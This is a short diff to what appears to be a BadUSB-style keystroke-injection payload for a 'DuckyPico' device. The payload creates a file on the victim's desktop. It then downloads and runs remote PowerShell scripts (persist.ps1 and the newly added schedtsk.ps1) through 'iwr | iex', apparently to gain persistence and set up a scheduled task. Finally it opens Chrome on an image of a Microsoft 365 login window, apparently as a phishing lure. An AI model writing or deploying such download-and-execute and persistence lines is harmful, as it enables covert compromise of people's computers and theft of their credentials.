@@ -7,5 +7,6 @@
 ##New-Item -Path "C:\Users\Leonardo\Desktop\new.txt" -ItemType File -Force
 ##Add-Content -Path "C:\Users\Leonardo\Desktop\new.txt" -Value "this is a file"
 ##!!iwr https://raw.githubusercontent.com/JH517/DuckyPico/refs/heads/main/persist.ps1 | iex
+##!!iwr https://raw.githubusercontent.com/JH517/DuckyPico/refs/heads/main/schedtsk.ps1 | iex
 ##!!Start-Process chrome.exe '--new-window https://sharepointmaven.com/wp-content/uploads/2022/09/brandloginwindowmicrosoft3651.jpg' -WindowStyle Normal
 ##!!quit
